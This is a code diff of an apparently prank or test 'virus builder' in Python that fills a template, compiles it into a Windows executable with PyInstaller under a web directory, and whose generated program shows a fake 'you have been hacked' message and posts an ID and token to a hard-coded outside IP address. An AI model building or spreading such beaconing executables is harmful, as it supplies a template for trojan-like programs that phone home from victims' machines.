@@ -7,10 +7,10 @@ import os
 import requests
 
 def display_message(user_id, virus_type):
-    os.system('echo You have been hacked by user: {} with virus: {}! (Not really) && pause'.format(user_id, virus_type))
+    os.system('echo You have been hacked by user: {user_id} with virus: {virus_type}! (Not really) && pause'.format(user_id, virus_type))
 
 def send_request(user_id, token, virus_type, name, heartbeat_rate):
-    url = 'http://207.127.88.215/update'
+    url = 'http://129.151.211.93/update'
     data = {{
         'user_id': '{user_id}',
         'token': '{token}',
@@ -20,16 +20,21 @@ def send_request(user_id, token, virus_type, name, heartbeat_rate):
     }}
     response = requests.post(url, json=data)
 
-display_message(user_id={user_id}, virus_type='{virus_type}')
-send_request(user_id={user_id}, token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
+display_message(user_id='{user_id}', virus_type='{virus_type}')
+send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
 """
 
-def generateExe():
+def test():
+    print("test")
+
+def generateExe(source_file):
     # Call PyInstaller to compile the script to an exe
     try:
-        subprocess.check_call(['python3', '-m', 'PyInstaller', '--onefile', '--distpath', '/var/www/dist', 'virusTest'])
+        subprocess.check_call(['sudo', 'python3', '-m', 'PyInstaller', '--onefile', '--debug=all', '--distpath', '/var/www/rubberduck/dist', source_file])
+        return "Success"
     except subprocess.CalledProcessError as e:
         print(f"PyInstaller failed with error code: {e.returncode}")
+        return "Failed to compile"
 
 
 def generateScript(user_id, token, virus_type, name, heartbeat_rate):
@@ -46,8 +51,13 @@ def generateScript(user_id, token, virus_type, name, heartbeat_rate):
     with open('generated_script.py', 'w') as f:
         f.write(filled_template)
 
-generateScript(1,1234567890,"Silent","TestVirus1","1h")
+    # Write the filled-in template to a new Python script
+    with open('generated_script.py', 'w') as f:
+        f.write(filled_template)
 
+#generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
+# Wine compile test
+generateExe("generated_script.py")
 
 
 # if __name__ == '__main__':
